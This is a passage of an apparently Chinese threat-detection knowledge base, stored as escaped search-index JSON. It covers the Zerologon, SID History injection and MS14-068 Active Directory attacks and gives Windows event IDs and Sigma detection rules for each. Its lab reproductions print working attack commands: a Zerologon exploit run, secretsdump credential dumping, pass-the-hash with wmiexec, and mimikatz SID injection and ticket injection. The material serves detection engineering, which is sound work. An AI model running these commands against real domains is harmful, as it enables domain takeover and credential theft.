<p>1\u3001\u5141\u8bb8\u5b58\u5728\u6f0f\u6d1e\u7684Netlogon\u5b89\u5168\u901a\u9053\u8fde\u63a5\u65f6\uff0c\u5c06\u751f\u6210event ID 5829</p> <p>2\u3001\u62d2\u7edd\u6613\u53d7\u653b\u51fb\u7684Netlogon\u8fde\u63a5\u65f6\uff0c\u5c06\u89e6\u53d1event ID 5827\u548c5828</p> <p>3\u3001\u5141\u8bb8\u5b58\u5728\u6f0f\u6d1e\u7684Netlogon\u8fde\u63a5\u65f6\u89e6\u53d1\u7684event ID 5830\u548c5831</p> <p>\u5982\u679c\u57df\u63a7\u5df2\u7ecf\u5b89\u88c5\u4e86\u8865\u4e01\uff0c\u8fd8\u53ef\u4ee5\u901a\u8fc7\u4ee5\u4e0a5\u4e2aevent ID\u8fdb\u884c\u5a01\u80c1\u72e9\u730e\u3002</p>"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1134-001-win-CVE-2020-1472/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u4ee5\u4e0b\u6a21\u62df\u6d4b\u8bd5\u8fc7\u7a0b\u6765\u81ea\u5b89\u5168\u5ba2\u76f8\u5173\u6587\u7ae0\uff0c\u4f20\u9001\u95e8</p> <p>\u5b9e\u9a8c\u73af\u5883\uff1a</p> <pre><code>\u57df\u63a7\uff1aWinserver2012 R2\uff08x64\uff09\nIP\uff1a10.10.10.10\nhostname\uff1aDC\n\u57df\uff1ade1ay.com\n</code></pre> <p></p> <pre><code>\u653b\u51fb\u673a\uff1aubuntu1604\uff08x64\uff09\nIP\uff1a10.10.10.111\n</code></pre> <p></p> <p>\u8fd0\u884cexp\u811a\u672c\uff0c\u6210\u529f\u5c06AD\u57df\u63a7\u7684\u673a\u5668\u8d26\u6237DC\u7684\u5bc6\u7801\u7f6e\u6362\u6210\u7a7a\uff1a</p> <pre><code>python3 cve-2020-1472-exploit.py  DC 10.10.10.10\n</code></pre> <p></p> <p>\u6b64\u65f6\u57df\u63a7\u670d\u52a1\u5668\u8d26\u6237\u5bc6\u7801\u4e3a\u7a7a\uff0c\u540c\u7b49\u4e8e\u5df2\u77e5\u5bc6\u7801\uff0c\u53ef\u4ee5\u5bfc\u51fa\u57df\u5185\u6240\u6709\u7528\u6237\u51ed\u636e\uff1a</p> <pre><code>python3 secretsdump.py de1ay/DC\\$@10.10.10.10 -no-pass\n</code></pre> <p></p> <p>\u5bfc\u51fahash\u540e\uff0c\u53d1\u73b0DC\u7684hash\u4e3a31d6cfe0d16ae931b73c59d7e0c089c0\uff0c\u4e5f\u5c31\u662f\u7a7a\u5bc6\u7801\uff0c\u540c\u65f6\u83b7\u5f97\u4e86\u57df\u7ba1administrator\u7684hash\uff0c\u5229\u7528administrator\u7684hash\u62ff\u4e0b\u57df\u63a7\uff1a</p> <pre><code>python3 wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24 Administrator@10.10.10.10\n</code></pre> <p></p>"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1134-001-win-CVE-2020-1472/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u6682\u65e0\uff0c\u5177\u4f53\u540c\u6837\u53ef\u53c2\u8003\u5b89\u5168\u5ba2\u6587\u7ae0\uff0c\u4f20\u9001\u95e8</p>"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1134-001-win-CVE-2020-1472/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1134-001-win-CVE-2020-1472/#sigma","title":"sigma\u89c4\u5219","text":""},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1134-001-win-CVE-2020-1472/#1","title":"\u68c0\u6d4b\u89c4\u52191","text":"<pre><code>title: Possible CVE-2020-1472 (zerologon)\ndescription: CVE-2020-1472 (Netlogon Elevation of Privilege Vulnerability) may create thousands of NetrServerReqChallenge &amp; NetrServerAuthenticate3 requests in a short amount of time.\nauthor: SOC Prime Team\ndate: 2020/09/11\nreferences:\n- https://github.com/SecuraBV/CVE-2020-1472\ntags:\n- attack.lateral_movement\n- attack.T1210\nlogsource:\n  product: zeek\n  service: dce_rpc\ndetection:\n  selection:\n    endpoint: 'netlogon'\n    operation: 'NetrServerReqChallenge'\n  selection2:\n    endpoint: 'netlogon'\n    operation: 'NetrServerAuthenticate3'\n  timeframe: 1m\n  condition: selection or selection2 | count() by src_ip &gt; 100\nfalsepositives:\n- 'unknown'\nlevel: high\n</code></pre>"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1134-001-win-CVE-2020-1472/#2","title":"\u68c0\u6d4b\u89c4\u52192","text":"<pre><code>title: Vulnerable Netlogon Secure Channel Connection Allowed\nid: a0cb7110-edf0-47a4-9177-541a4083128a\nstatus: experimental\ndescription: Detects that a vulnerable Netlogon secure channel connection was allowed, which could be an indicator of CVE-2020-1472.\nreferences:\n    - https://support.microsoft.com/en-us/help/4557222/how-to-manage-the-changes-in-netlogon-secure-channel-connections-assoc\nauthor: NVISO\ndate: 2020/09/15\ntags:\n    - attack.privilege_escalation\nlogsource:\n    product: windows\n    service: system\ndetection:\n    selection:\n        EventID:\n            - 5829 #\u5177\u5907\u4e00\u5b9a\u7684\u5c40\u9650\u6027\uff0c\u9700\u8981\u57df\u63a7\u4e3b\u673a\u6253\u5b8c\u8865\u4e01\u540e\uff0c\u65b9\u53ef\u4f7f\u7528\n    condition: selection\nfields:\n    - SAMAccountName\nfalsepositives:\n    - Unknown\nlevel: high\n</code></pre>"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1134-001-win-CVE-2020-1472/#_6","title":"\u5efa\u8bae","text":"<p>\u76f8\u5173\u89c4\u5219\u672a\u5728\u771f\u5b9e\u73af\u5883\u4e2d\u8fdb\u884c\u6d4b\u8bd5\uff0c\u6548\u679c\u672a\u77e5\u3002</p>"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1134-001-win-CVE-2020-1472/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1134-001</p> <p>https://attack.mitre.org/techniques/T1134/001/</p> <p>ZeroLogon\uff08CVE-2020-1472\uff09\u5206\u6790\u4e0e\u72e9\u730e </p> <p>https://www.anquanke.com/post/id/219090#h2-2</p> <p>win_vul_cve_2020_1472-sigma</p> <p>https://github.com/Neo23x0/sigma/blob/2cd9b794e677a038f3ace5b15d649ca191809846/rules/windows/builtin/win_vul_cve_2020_1472.yml</p> <p>zeek\u5b98\u65b9</p> <p>https://zeek.org/</p>"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1134-005-win-SID%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95%E6%B3%A8%E5%85%A5/","title":"T1134-005-win-SID\u5386\u53f2\u8bb0\u5f55\u6ce8\u5165","text":""},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1134-005-win-SID%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95%E6%B3%A8%E5%85%A5/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>Windows\u5b89\u5168\u6807\u8bc6\u7b26\uff08SID\uff09\u662f\u6807\u8bc6\u7528\u6237\u6216\u7ec4\u5e10\u6237\u7684\u552f\u4e00\u503c\u3002Windows\u5b89\u5168\u5728\u5b89\u5168\u63cf\u8ff0\u7b26\u548c\u8bbf\u95ee\u4ee4\u724c\u4e2d\u90fd\u4f7f\u7528SID\u3002\u5e10\u6237\u53ef\u4ee5\u5728SID\u5386\u53f2Active Directory\u5c5e\u6027\u4fdd\u7559\u5176\u4ed6SID \uff0c\u4ece\u800c\u5141\u8bb8\u57df\u4e4b\u95f4\u53ef\u4e92\u64cd\u4f5c\u7684\u5e10\u6237\u8fc1\u79fb\uff08\u4f8b\u5982\uff0cSID\u5386\u53f2\u4e2d\u7684\u6240\u6709\u503c\u90fd\u5305\u542b\u5728\u8bbf\u95ee\u4ee4\u724c\u4e2d\uff09\u3002</p> <p>\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u6b64\u673a\u5236\u8fdb\u884c\u7279\u6743\u5347\u7ea7\u3002\u501f\u52a9\u57df\u7ba1\u7406\u5458\uff08\u6216\u540c\u7b49\u6743\u9650\uff09\u6743\u9650\uff0c\u53ef\u4ee5\u5c06\u6536\u96c6\u7684\u6216\u4f17\u6240\u5468\u77e5\u7684SID\u503c\u63d2\u5165SID\u5386\u53f2\u8bb0\u5f55\u4e2d\uff0c\u4ee5\u6a21\u62df\u4efb\u610f\u7528\u6237/\u7ec4\uff0c\u4f8b\u5982\u4f01\u4e1a\u7ba1\u7406\u5458\u3002\u901a\u8fc7\u6a2a\u5411\u79fb\u52a8\u6280\u672f\uff08\u4f8b\u5982\uff0c\u8fdc\u7a0b\u670d\u52a1\uff0cWindows Admin\u5171\u4eab\u6216Windows\u8fdc\u7a0b\u7ba1\u7406\uff09\uff0c\u6b64\u64cd\u4f5c\u53ef\u80fd\u5bfc\u81f4\u5bf9\u672c\u5730\u8d44\u6e90\u7684\u8bbf\u95ee\u6216\u5bf9\u539f\u672c\u65e0\u6cd5\u8bbf\u95ee\u7684\u57df\u7684\u8bbf\u95ee\u3002</p>"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1134-005-win-SID%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95%E6%B3%A8%E5%85%A5/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u6d4b\u8bd5\u5de5\u5177\u53ef\u4ee5\u662fEmpire\uff0c\u4e5f\u53ef\u4ee5\u662fmimikatz\u3002</p> <ul> <li>\u5982\u679c\u5728\u57df\u63a7\u5236\u5668\u4e0a\uff0cEmpire\u53ef\u4ee5\u5411\u7528\u6237\u6dfb\u52a0SID\u5386\u53f2\u8bb0\u5f55\u3002</li> <li>Mimikatz\u7684<code>MISC::AddSid</code>\u6a21\u5757\u53ef\u4ee5\u5c06\u4efb\u4f55SID\u6216\u7528\u6237/\u7ec4\u5e10\u6237\u9644\u52a0\u5230\u7528\u6237\u7684SID\u5386\u53f2\u8bb0\u5f55\u4e2d\u3002Mimikatz\u8fd8\u5229\u7528SID\u5386\u53f2\u8bb0\u5f55\u6ce8\u5165\u6765\u6269\u5c55\u5176\u4ed6\u7ec4\u4ef6\u7684\u8303\u56f4\uff0c\u4f8b\u5982\u751f\u6210\u7684Kerberos Golden Ticket\u548cDCSync\u8d85\u51fa\u5355\u4e2a\u57df\u3002</li> </ul> <p>Mimikatz\u652f\u6301SID\u5386\u53f2\u6ce8\u5165\u5230\u4efb\u4f55\u7528\u6237\u5e10\u6237\uff08\u9700\u8981\u57df\u7ba1\u7406\u5458\u6216\u7b49\u6548\u7684\u6743\u9650\uff09\u3002 \u6ce8\u610f\uff1a ADDSID\u5df2\u79fb\u81f32.1\u7248\u672c\u5206\u652f\u4e2d\u7684SID\u6a21\u5757\u3002</p> <pre><code>mimikatz \"privilege::debug\" \"sid::patch\" \"sid::add /new:administrator /sam:abcc\" \"exit\"\n</code></pre> <pre><code>mimikatz \"privilege::debug\" \"sid::patch\" \"sid::clear /sam:abcc\" \"exit\"  \u6e05\u9664SID\u5386\u53f2\u8bb0\u5f55\u6ce8\u5165\n</code></pre>"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1134-005-win-SID%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95%E6%B3%A8%E5%85%A5/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows\u5b89\u5168\u65e5\u5fd7\uff0c4766\u30014765</p>"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1134-005-win-SID%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95%E6%B3%A8%E5%85%A5/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u6682\u65e0\u5177\u4f53\u5b9e\u4f8b\uff0c\u53ef\u53c2\u8003\u4e0a\u8ff0\u5b9e\u4f8b\u547d\u4ee4\uff1a</p> <pre><code>mimikatz \"privilege::debug\" \"sid::patch\" \"sid::add /new:administrator /sam:abcc\" \"exit\"\n</code></pre>"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1134-005-win-SID%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95%E6%B3%A8%E5%85%A5/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u6682\u65e0\uff08\u6ce8\u610f\u4e8b\u9879\uff1a4766\u30014765\u4ec5\u9650\u57df\u63a7\u4e3b\u673a\u662fWindows server 2016\u53cawin10\u4ee5\u4e0a\u4f1a\u4ea7\u751f\u6b64\u4e8b\u4ef6\uff09</p>"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1134-005-win-SID%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95%E6%B3%A8%E5%85%A5/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1134-005-win-SID%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95%E6%B3%A8%E5%85%A5/#sigma","title":"sigma\u89c4\u5219","text":"<pre><code>title: Windows SID\u5386\u53f2\u8bb0\u5f55\u521b\u5efa\u57df\u63a7\u6743\u9650\u540e\u95e8\ndescription: \u57df\u73af\u5883\u6d4b\u8bd5\nreferences: https://adsecurity.org/?p=1772\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID:\n         - 4766 #\u5c1d\u8bd5\u5c06SID\u5386\u53f2\u8bb0\u5f55\u6dfb\u52a0\u5230\u5e10\u6237\u5931\u8d25\u3002\n         - 4765 #\u5df2\u5c06 SID \u5386\u53f2\u8bb0\u5f55\u6dfb\u52a0\u5230\u5e10\u6237\u3002\n    condition: selection\nlevel: medium\n</code></pre> <p>\u6ce8\u610f\u6b64\u68c0\u6d4b\u89c4\u5219\u7684\u9002\u7528\u8303\u56f4\uff1aWindows10\u3001Windows Server 2016\uff0c\u6b64\u4e8b\u4ef6\u5728\u5c06SID\u5386\u53f2\u8bb0\u5f55\u6dfb\u52a0\u5230\u5e10\u6237\u65f6\u751f\u6210\u3002</p>"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1134-005-win-SID%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95%E6%B3%A8%E5%85%A5/#_6","title":"\u5efa\u8bae","text":"<p>\u68c0\u6d4b\u7279\u5f81\u672a\u7ecf\u5b9e\u9645\u6d4b\u8bd5\uff0c\u8c28\u614e\u4f7f\u7528</p>"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1134-005-win-SID%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95%E6%B3%A8%E5%85%A5/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1134-005</p> <p>https://attack.mitre.org/techniques/T1134/005/</p> <p>\u57df\u6e17\u900f-\u57df\u7ef4\u6743</p> <p>https://uknowsec.cn/posts/notes/\u57df\u6e17\u900f-\u57df\u7ef4\u6743.html</p> <p>\u5982\u4f55\u5229\u7528SID History\u521b\u5efa\u57df\u63a7\u6743\u9650\u540e\u95e8\uff1f</p> <p>https://www.4hou.com/penetration/5476.html</p>"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1212-win-ms14-068-KEKEO/","title":"T1212-windows-MS14-068-KEKEO","text":""},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1212-win-ms14-068-KEKEO/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u7968\u636e\u4f20\u9012\u653b\u51fb\uff08PtT\uff09\u662f\u4e00\u79cd\u4e0d\u8bbf\u95ee\u8d26\u53f7\u5bc6\u7801\u800c\u4f7f\u7528Kerberos\u51ed\u636e\u5bf9\u7528\u6237\u8fdb\u884c\u8eab\u4efd\u8ba4\u8bc1\u7684\u65b9\u6cd5\u3002Kerberos\u8eab\u4efd\u8ba4\u8bc1\u53ef\u4ee5\u662f\u6a2a\u5411\u79fb\u52a8\u5230\u8fdc\u7a0b\u7cfb\u7edf\u7684\u7b2c\u4e00\u6b65\u3002</p> <p>\u5728\u4f7f\u7528PtT\u6280\u672f\u65f6\uff0c\u53ef\u901a\u8fc7\u51ed\u636e\u5bfc\u51fa\u6280\u672f\u83b7\u53d6\u6709\u6548\u8d26\u53f7\u7684Kerberos\u7968\u636e\u3002PtT\u53ef\u80fd\u4f1a\u83b7\u53d6\u5230\u7528\u6237\u7684\u670d\u52a1\u7968\u636e\u6216\u7968\u636e\u6388\u4e88\u7968\u636e\uff08TGT\uff09\uff0c\u5177\u4f53\u53d6\u51b3\u4e8e\u8bbf\u95ee\u7ea7\u522b\u3002\u670d\u52a1\u7968\u636e\u5141\u8bb8\u8bbf\u95ee\u7279\u5b9a\u8d44\u6e90\uff0c\u800cTGT\u53ef\u7528\u4e8e\u4ece\u7968\u636e\u6388\u4e88\u670d\u52a1\uff08TGS\uff09\u8bf7\u6c42\u670d\u52a1\u7968\u636e\uff0c\u7528\u6765\u8bbf\u95ee\u7528\u6237\u6709\u6743\u8bbf\u95ee\u7684\u4efb\u4f55\u8d44\u6e90\u3002</p> <p>PtT\u6280\u672f\u53ef\u4ee5\u4e3a\u4f7f\u7528Kerberos\u4f5c\u4e3a\u8eab\u4efd\u8ba4\u8bc1\u673a\u5236\u7684\u670d\u52a1\u83b7\u53d6\u767d\u94f6\u7968\u636e\uff0c\u5e76\u7528\u4e8e\u751f\u6210\u7968\u636e\u6765\u8bbf\u95ee\u7279\u5b9a\u8d44\u6e90\u548c\u627f\u8f7d\u8be5\u8d44\u6e90\u7684\u7cfb\u7edf\uff08\u4f8b\u5982\uff0cSharePoint\uff09\u3002</p> <p>PtT\u6280\u672f\u8fd8\u53ef\u4ee5\u4f7f\u7528\u5bc6\u94a5\u5206\u53d1\u670d\u52a1\u8d26\u53f7KRBTGT\u5e10\u6237NTLM\u54c8\u5e0c\u6765\u83b7\u5f97\u57df\u7684\u9ec4\u91d1\u7968\u636e\uff0c\u4ece\u800c\u4e3a\u6d3b\u52a8\u76ee\u5f55\u4e2d\u7684\u4efb\u4e00\u8d26\u53f7\u751f\u6210TGT\u3002</p>"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1212-win-ms14-068-KEKEO/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u53ef\u53c2\u8003\uff1a\u5185\u7f51\u6e17\u900f\u4e4bPTH&amp;PTT&amp;PTK</p>"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1212-win-ms14-068-KEKEO/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows \u5b89\u5168\u65e5\u5fd7\uff08AD\u57df\u63a7\u65e5\u5fd7\uff09</p>"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1212-win-ms14-068-KEKEO/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u6682\u65e0</p>"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1212-win-ms14-068-KEKEO/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u6d4b\u8bd5\u7559\u75d5\u6587\u4ef6\uff1a\u6682\u65e0</p>"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1212-win-ms14-068-KEKEO/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1212-win-ms14-068-KEKEO/#sigma","title":"sigma\u89c4\u5219","text":"<pre><code>title: MS14-068-PYKEK\ndescription: windows server 2008 / windows 7\nreferences: https://www.blackhat.com/docs/us-15/materials/us-15-Metcalf-Red-Vs-Blue-Modern-Active-Directory-Attacks-Detection-And-Protection-wp.pdf\ntags: T1212\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n    product: windows\n    service: Security\ndetection:\n    selection1:\n        EventID: 4624 #\u8d26\u6237\u767b\u5f55\n        Account Domain: '*.*' #\u65b0\u767b\u5f55&gt;\u8d26\u6237\u57df(\u6b63\u5e38\u60c5\u51b5\u4e0b\uff0c\u8d26\u6237\u57df\u5e94\u4e3aABC\uff0c\u5f53\u5b58\u5728KEKEO\u653b\u51fb\u65f6\uff0c\u8d26\u6237\u57df\u4e3aABC.COM)\n    selection2:\n        EventID: 4672 #\u7ba1\u7406\u5458\u767b\u5f55\n        Account Domain:  #\u8d26\u6237\u57df(\u6b63\u5e38\u60c5\u51b5\u4e0b\uff0c\u8d26\u6237\u57df\u5e94\u4e3aABC\uff0c\u5f53\u5b58\u5728KEKEO\u653b\u51fb\u65f6\uff0c\u8d26\u6237\u57df\u4e3a\u7a7a)\n    selection3:\n        EventID: 4768 #Kerberos TGS\u8bf7\u6c42\n        Supplied Realm Name: '*.*' #\u5df2\u63d0\u4f9b\u7684\u9886\u57df\u540d\u79f0(\u6b63\u5e38\u60c5\u51b5\u4e0b\uff0c\u5df2\u63d0\u4f9b\u7684\u9886\u57df\u540d\u79f0\u5e94\u4e3aABC\uff0c\u5f53\u5b58\u5728KEKEO\u653b\u51fb\u65f6\uff0c\u5df2\u63d0\u4f9b\u7684\u9886\u57df\u540d\u79f0\u4e3aABC.COM)\n    timeframe: last 5s\n    condition: all of them\nlevel: medium\n</code></pre> <p>\u5176\u4e2d4768\u9700\u8981\u6392\u9664\u6b63\u5e38\u6761\u4ef6\uff0c\u6bd4\u5982\u670d\u52a1 ID:S-1-0-0\u6216\u8005\u7528\u6237\u540d\u4e3antp$ \u8ba1\u7b97\u673a\u65f6\u95f4\u540c\u6b65</p>"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1212-win-ms14-068-KEKEO/#_6","title":"\u5efa\u8bae","text":"<p>\u672c\u89c4\u5219\u672a\u7ecf\u8fc7\u5b9e\u9645\u73af\u5883\u6d4b\u8bd5\uff0c\u8c28\u614e\u4f7f\u7528</p>"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1212-win-ms14-068-KEKEO/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1212</p> <p>https://attack.mitre.org/techniques/T1212/</p> <p>\u5185\u7f51\u6e17\u900f\u4e4bPTH&amp;PTT&amp;PTK</p> <p>https://www.bbsmax.com/A/A7zgkjRPz4/</p>"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1212-win-ms14-068-PYKEK/","title":"T1212-windows-MS14-068-PYKEK","text":""},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1212-win-ms14-068-PYKEK/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5229\u7528\u8f6f\u4ef6\u6f0f\u6d1e\u6765\u5c1d\u8bd5\u6536\u96c6\u51ed\u636e\u3002\u5f53\u653b\u51fb\u8005\u5229\u7528\u7a0b\u5e8f\uff0c\u670d\u52a1\u6216\u64cd\u4f5c\u7cfb\u7edf\u8f6f\u4ef6\u6216\u5185\u6838\u672c\u8eab\u5185\u7684\u7f16\u7a0b\u9519\u8bef\u6765\u6267\u884c\u653b\u51fb\u8005\u63a7\u5236\u7684\u4ee3\u7801\u65f6\uff0c\u5c31\u4f1a\u5229\u7528\u8f6f\u4ef6\u6f0f\u6d1e\u3002\u51ed\u636e\u548c\u8eab\u4efd\u9a8c\u8bc1\u673a\u5236\u53ef\u80fd\u4f1a\u88ab\u653b\u51fb\u8005\u5229\u7528\uff0c\u4ee5\u6b64\u4f5c\u4e3a\u83b7\u53d6\u6709\u7528\u51ed\u636e\u7684\u9014\u5f84\u6216\u89c4\u907f\u83b7\u53d6\u7cfb\u7edf\u8bbf\u95ee\u6743\u9650\u7684\u8fc7\u7a0b\u3002\u5176\u4e2d\u4e00\u4e2a\u793a\u4f8b\u662fMS14-068\uff0c\u5b83\u9488\u5bf9Kerberos\uff0c\u53ef\u7528\u4e8e\u4f7f\u7528\u57df\u7528\u6237\u6743\u9650\u4f2a\u9020Kerberos\u7968\u8bc1.\u5bf9\u51ed\u636e\u8bbf\u95ee\u7684\u5229\u7528\u8fd8\u53ef\u80fd\u5bfc\u81f4\u7279\u6743\u5347\u7ea7\uff0c\u5177\u4f53\u53d6\u51b3\u4e8e\u76ee\u6807\u8fc7\u7a0b\u6216\u83b7\u53d6\u7684\u51ed\u636e\u3002</p>"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1212-win-ms14-068-PYKEK/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u53ef\u53c2\u8003\uff1a\u5185\u7f51\u6e17\u900f\u4e4bPTH&amp;PTT&amp;PTK</p>"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1212-win-ms14-068-PYKEK/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows \u5b89\u5168\u65e5\u5fd7\uff08AD\u57df\u63a7\u65e5\u5fd7\uff09</p>"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1212-win-ms14-068-PYKEK/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u6d4b\u8bd5\u6b65\u9aa4</p> <p>\u57df\u63a7\u4e3b\u673a\uff08Windows server 2008\uff09 \u57df\u5185\u4e3b\u673a\uff08Windows 7 SP1\uff09</p> <pre><code>whoami /user #\u57df\u5185\u4e3b\u673a\u67e5\u627e\u5f53\u524d\u7528\u6237SID\ndir \\\\DC\\C$  #\u67e5\u770b\u8bbf\u95eeDC\u7684\u6743\u9650\nms14-.exe -u \u57df\u6210\u5458\u540d@\u57df\u540d -s \u57df\u6210\u5458sid -d \u57df\u63a7\u5236\u5668\u5730\u5740 -p \u57df\u6210\u5458\u5bc6\u7801 #\u57df\u673a\u5668\u662f\u53ef\u4ee5\u548c\u57df\u63a7\u5236\u5668\u4e92\u901a\u5219\u4f1a\u521b\u5efa.ccache\u6587\u4ef6\n</code></pre> <p>\u7968\u636e\u6ce8\u5165</p> <pre><code>mimikatz # kerberos::purge         //\u6e05\u7a7a\u5f53\u524d\u673a\u5668\u4e2d\u6240\u6709\u51ed\u8bc1\uff0c\u5982\u679c\u6709\u57df\u6210\u5458\u51ed\u8bc1\u4f1a\u5f71\u54cd\u51ed\u8bc1\u4f2a\u9020\nmimikatz # kerberos::list          //\u67e5\u770b\u5f53\u524d\u673a\u5668\u51ed\u8bc1\nmimikatz # kerberos::ptc \u7968\u636e\u6587\u4ef6   //\u5c06\u7968\u636e\u6ce8\u5165\u5230\u5185\u5b58\u4e2d\n</code></pre> <p>\u4f7f\u7528mimikatz\u5c06\u7968\u636e\u6ce8\u5165\u5230\u5f53\u524d\u5185\u5b58\u4e2d\uff0c\u4f2a\u9020\u51ed\u8bc1\uff0c\u5982\u679c\u6210\u529f\u5219\u62e5\u6709\u57df\u7ba1\u7406\u6743\u9650\uff0c\u53ef\u4efb\u610f\u8bbf\u95ee\u57df\u4e2d\u6240\u6709\u673a\u5668</p>"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1212-win-ms14-068-PYKEK/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u6d4b\u8bd5\u7559\u75d5\u6587\u4ef6\uff1aMS14-068-PYKEK-windows.log</p>"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1212-win-ms14-068-PYKEK/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1212-win-ms14-068-PYKEK/#sigma","title":"sigma\u89c4\u5219","text":"<pre><code>title: MS14-068-PYKEK\ndescription: windows server 2008 / windows 7\nreferences: https://github.com/ThreatHuntingProject/ThreatHunting/blob/master/hunts/golden_ticket.md\ntags: T1212\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n    product: windows\n    service: Security\ndetection:\n    selection1:\n        EventID: 4624 #\u8d26\u6237\u767b\u5f55\n        Account Domain: '*.*' #\u65b0\u767b\u5f55&gt;\u8d26\u6237\u57df(\u6b63\u5e38\u60c5\u51b5\u4e0b\uff0c\u8d26\u6237\u57df\u5e94\u4e3aABC\uff0c\u5f53\u5b58\u5728PYKEK\u653b\u51fb\u65f6\uff0c\u8d26\u6237\u57df\u4e3aABC.COM)\n        Account Name: '*' #\u65b0\u767b\u5f55&gt;\u8d26\u6237\u540d(\u4e0d\u540c\u4e8e\u5b89\u5168\u6807\u8bc6\u7684\u5e10\u6237\uff0c\u6b64\u6761\u4ef6\u5b9e\u73b0\u8d77\u6765\u8f83\u4e3a\u590d\u6742)\n    selection2:\n        EventID: 4672 